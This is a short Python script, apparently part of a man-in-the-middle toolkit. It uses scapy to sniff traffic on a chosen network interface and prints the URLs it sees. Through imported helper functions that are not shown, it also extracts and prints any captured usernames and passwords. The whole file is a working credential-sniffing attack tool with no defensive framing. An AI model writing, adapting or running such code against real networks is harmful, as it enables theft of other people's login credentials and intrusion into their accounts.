from scapy.all import sniff
from mitm_helper_func import get_url, get_login_info
import argparse

def process_sniffed_packet(pkt):
	url = get_url(pkt)
	if url:
		print(url.decode())

		login_info = get_login_info(pkt)
		if login_info:
			print("[*] Username and Password Found ==> " + login_info.decode())

def sniff_packet(interface):
	sniff(iface=interface, store=False, prn=process_sniffed_packet)

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('-i', '--interface', help='Interface to sniff')
	args = parser.parse_args()
	interface = args.interface

	sniff_packet(interface)

if __name__ == '__main__':
	main()